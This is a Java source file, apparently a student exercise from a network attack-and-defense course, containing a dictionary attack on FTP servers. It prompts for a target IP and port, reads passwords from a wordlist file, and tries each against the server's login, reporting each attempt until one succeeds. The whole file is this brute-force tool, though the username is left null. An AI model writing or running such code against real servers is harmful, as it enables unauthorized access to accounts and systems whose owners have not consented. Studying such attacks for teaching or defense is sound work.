import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.SocketException;
import java.util.Scanner;

public class Test2 {
    public static FtpBean ftpBean(String address, String port, String username, String passwd) {
        FtpBean ftp = new FtpBean();
        ftp.setAddress(address);
        ftp.setPort(port);
        ftp.setUsername(username);
        ftp.setPasswd(passwd);
        return ftp;
    }

    public static boolean check2(FtpBean ftpBean) {
        boolean result = false;
        FTPClient ftpClient = new FTPClient();
        try {
            int reply;
            ftpClient.connect(ftpBean.getAddress(), Integer.valueOf(ftpBean.getPort()));
            ftpClient.login(ftpBean.getUsername(), ftpBean.getPasswd());
            reply = ftpClient.getReplyCode();
            System.out.println("状态码" + reply);
            if (!FTPReply.isPositiveCompletion(reply)) {
                ftpClient.disconnect();

            } else {
                ftpClient.disconnect();
                result = true;

            }
        } catch (SocketException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result;
    }

    public static void main(String[] args) throws Exception {
        Scanner in = new Scanner(System.in);
        System.out.println("请输入测试的IP地址");
        String ip = in.nextLine();
        System.out.println("请输入用户的端口号");
        String port = in.nextLine();
        String username = null;
        int count = 0;
        File file = new File("E://网络攻防//zidian.txt");
        if (!file.exists()) {
            throw new Exception("抱歉，您请求的文件不存在");
        }
        FileReader fileReader = new FileReader(file);
        BufferedReader bufferedReader = new BufferedReader(fileReader);
        String passwd;
        while ((passwd = bufferedReader.readLine()) != null) {
            count++;
            FtpBean ftp;
            ftp = ftpBean(ip, port, username, passwd);
            boolean result = check2(ftp);
            System.out.println("第" + count + "次扫描，密码为：" + passwd);
            System.out.println(result);
            if (result == true) break;
        }
        bufferedReader.close();
    }

}
